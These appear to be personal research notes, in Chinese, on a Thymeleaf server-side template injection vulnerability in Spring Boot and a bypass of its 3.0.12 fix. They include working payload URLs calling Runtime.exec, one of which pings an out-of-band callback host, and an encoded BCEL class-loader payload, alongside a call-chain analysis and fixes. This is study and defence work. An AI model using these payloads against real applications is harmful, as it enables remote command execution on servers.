参考
https://turn1tup.github.io/2021/08/10/spring-boot-thymeleaf-ssti/
https://www.freebuf.com/articles/web/339962.html

# thymeleaf 
version <= 3.0.11.RELEASE 存在ssti漏洞
version = 3.0.12.RELEASE 修复, 但可绕过, 并且通用
https://github.com/thymeleaf/thymeleaf/compare/thymeleaf-spring5-3.0.11.RELEASE...thymeleaf-spring5-3.0.12.RELEASE?diff=unified#

# 漏洞利用
```text
poc(bypass 3.0.12.RELEASE)
1.不要有new关键字
2.T(之间要有分隔符(%20 %0a %09 %0d %00之一)
3.绕过SpringRequestUtils.checkViewNameNotInRequest, __${}__前增加(;/或者//), 比如返回void并且templates在urlpath中添加的时候/doc/{document}
4.我们输入是模版的名称或者一部分
/path?lang=;/__$%7bT%20(java.lang.Runtime).getRuntime().exec("open%20-a Calculator.app")%7d__::.xjj
/path?lang=;/__$%7bT%20(java.lang.Runtime).getRuntime().exec("ping 1234.e4j37wz7vs307ez7x68zd1w0nrtih7.oastify.com")%7d__::.xjj

结合bcel(JDK251后BCEL使用不了)
/lang=::__${"".getClass().forName("$$BCEL$$$l$8b$I$A$A$A$A$A$A$AePMO$c2$40$U$9c$85B$a1$W$84$e2$f7$b7$t$c1$83$3dx$c4x1z$b1$w$R$83$e7$ed$b2$c1$c5$d2$92R$8c$fe$o$cf$5e$d4x$f0$H$f8$a3$8c$af$x$R$a3$7bx$_o$e6$cdL$de$7e$7c$be$bd$D$d8$c7$b6$F$Ts$W$e6$b1P$c0b$da$97L$y$9bX1$b1$ca$90$3fP$a1J$O$Z$b2$f5F$87$c18$8a$ba$92a$d6S$a1$3c$l$P$7c$Z_q$3f$m$c4$f1$o$c1$83$O$8fU$3aO$40$p$b9Q$a3$94$T$d1$c0$f5$a5$I$dc$W$7f$I$o$dem2$U$OD0$b1$$$b5$T$$n$cf$f8P$cb$u$9c$c1jG$e3X$c8$T$95$da$d8$T$d5$5e$9f$dfq$h$F$UM$ac$d9X$c7$GEP$aa$b0$b1$89$z$86Z$ca$bb$B$P$7b$ee$f1$bd$90$c3DE$nC$e5o8A$d3$c5$L$bf$_E$c2P$9dB$97$e30Q$D$ca$b5z2$f9$Z$e6$eb$N$ef$df$O$dda$c8$7b$v$Yv$ea$bf$d8v$S$ab$b0$d7$fc$zh$c5$91$90$a3Q$T$db$c8$d3$7f$a7$_$D$96$deB$d5$a2$c9$a5$ce$a8$e7v_$c0$9e4$3dC5$af$c1$Ml$aa$f6$f7$CJ$uS$_$60$f6G$7c$a1$cd$80$f2$x2N$f6$Z$c6$f5$p$8c$d3$t$8d$VI$97CV$bb90$a8$9a$84YH$3f$b2D$a8$ad$fd$81$8af2$9e$89$wH$e8h$b8$f6$Fz7$85$d0$t$C$A$A", true, "".getClass().forName("com.sun.org.apache.bcel.internal.util.ClassLoader").newInstance())}_______________
```

# 漏洞分析
## 前置学习thymeleaf
1.TemplateEngine(process)
2.TemplateManager(parseAndProcess)
3.ThymeleafViewResolver(createView)
File/ServletContext/SpringResource/String/Url + TemplateResolver

https://waylau.gitbooks.io/thymeleaf-tutorial/content/docs/standard-expression-syntax.html

## 调用链
渲染的时候产生的问题
DispatcherServlet.render()
 ThymeleafView.renderFragment()
  StandardExpressionPreprocessor.parseExpression()
   StandardExpressionPreprocessor.preprocess()
    PREPROCESS_EVAL_PATTERN.matcher(input);
    VariableExpression.execute()

## 解释poc

```text
1.::
org.thymeleaf.spring5.view.ThymeleafView.renderFragment()中执行else部分
if (!viewTemplateName.contains("::")) {} else {...}
代表含义fragment
// Template name contains a fragment name, so we should parse it as such
<p insert="~{page::fragment}"></p>来插入内容

2.__${Expression}__
__${…}__ 是 thymeleaf 中的预处理表达式，也就是会对双下划线包起来的表达式进行预处理, 预处理时遵循SpEL。
org.thymeleaf.standard.expression.StandardExpressionPreprocessor.preprocess()中正则匹配
final Matcher matcher = PREPROCESS_EVAL_PATTERN.matcher(input);
PREPROCESS_EVAL_PATTERN = "\_\_(.*?)\_\_"
input = "~{user/__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("open -a Calculator.app").getInputStream()).next()}__::.x/welcome}"

最终执行: new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("open -a Calculator.app").getInputStream()).next()
```

## 绕过
绕过检查
1.org.thymeleaf.spring5.util.SpringRequestUtils.checkViewNameNotInRequest
2.org.thymeleaf.spring5.util.SpringStandardExpressionUtils#containsSpELInstantiationOrStatic

矩阵变量绕过
org.springframework.web.util.UrlPathHelper.decodeAndCleanUriString中
org.springframework.web.util.UrlPathHelper.removeSemicolonContent移除;/中的; (;后面必须要有个/ 这样会移除二者之间的内容, 否则就是移除;后面所有的内容)
org.springframework.web.util.UrlPathHelper.getSanitizedPath将//变成/
利用矩阵变量的移除;操作, 让checkViewNameNotInRequest中vn和requestUri不同, 进而found = false就绕过了

new关键字以及T()绕过
T(之间增加特殊字符, 使用其他方式替代new关键字

## 提出问题
1.研究一下作者给出的poc
::代表renderFragment, 在传入的viewName中含有fragment, 需要处理一下
/doc/{document}返回void时传入的名称作为viewName
redirect不会产生问题, 不会解析为表达式
/safe/doc/{document}传参增加了response所以无法利用

2.url利用中关于编码的问题
尝试了直接输入也可以没问题 
{}需要使用url编码, %7b%7d

3.漏洞产生的根本原因
在解析fragment的时候进行了表达式执行, 可以通过构造达到执行命令的效果

(1)
org.springframework.web.servlet.DispatcherServlet.processDispatchResult中
在获取ModelAndView结果之后进行渲染, 传入render()函数
其中model为null
而view为`user/__${T(java.lang.Runtime).getRuntime().exec("open -a Calculator.app")}__::.x/welcome`, 也就是模版的位置
(2)
org.springframework.web.servlet.DispatcherServlet.render()
拿到ThymeleafView, 然后使用这个view进行渲染
view.render(mv.getModelInternal(), request, response);
(3)
renderFragment进行实际的渲染动作
(4)
parser.parseExpression()解析模版的viewName
StandardExpressionPreprocessor.preprocess()预处理输入的viewName
最终执行expression.execute(context, ...)

4.如何修复
方法1使用ResponseBody
方法2使用redirect
方法3在传入参数增加response

5.执行表达式为什么是${expression}
`__${}__`是 thymeleaf 中的预处理表达式，也就是会对双下划线包起来的表达式进行预处理
而且使用${}会解析为VariableExpression, 只有VariableExpression可以执行SpEL
变量表达式可以是OGNL表达式或者是 Spring EL，如果集成了Spring的话，可以在上下文变量（context variables ）中执行。

6.其他的执行表达式都有哪些方式
OGNL

7.如何挖到这样的漏洞
首先要熟悉thymeleaf, 知道有__${}__, 这么一个预处理的东西
其次要熟悉SpEL, 知道怎么构造执行表达式
然后要熟悉源代码, 调试很多遍, 而且范围要很广, 才能最终锁定这一个地方

8.thymeleaf从访问到给出页面的整个流程是怎样的, 从代码层面给出流程图
org.springframework.web.servlet.DispatcherServlet.doDispatch拿到mv
org.springframework.web.servlet.DispatcherServlet.processDispatchResult将mv放入模版中, render()

## 调试遇到的问题:
1.run可以访问, 但是debug无法访问??
使用idea service发现卡住，然后去掉了所有断点就可以了

